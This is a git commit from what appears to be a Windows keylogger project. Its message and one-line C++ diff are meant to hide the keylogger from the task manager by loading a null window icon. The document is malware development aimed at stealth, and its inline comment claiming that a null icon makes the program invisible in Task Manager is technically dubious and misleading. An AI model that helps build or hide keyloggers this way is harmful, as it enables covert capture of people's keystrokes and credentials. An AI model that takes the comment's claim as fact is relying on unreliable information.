32df6243932bfbb883693b3eea3cbb0e0b282d00
Roman <roma.grief@outlook.com>
2020-12-29 14:19:12 +0200

    invisible from proc. manager

--- KeyLogger/KeyLogger/KeyLogger.cpp
+++ KeyLogger/KeyLogger/KeyLogger.cpp
@@ -54,7 +54,7 @@ ATOM MyRegisterClass(HINSTANCE hInstance)
     wcex.cbClsExtra     = 0;
     wcex.cbWndExtra     = 0;
     wcex.hInstance      = hInstance;
-    wcex.hIcon          = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_KEYLOGGER));
+    wcex.hIcon          = LoadIcon(hInstance, 0);//if 2nd parameter == 0 -> Invisible in task manager
     wcex.hCursor        = LoadCursor(nullptr, IDC_ARROW);
     wcex.hbrBackground  = (HBRUSH)(COLOR_WINDOW+1);
     wcex.lpszMenuName   = 0;
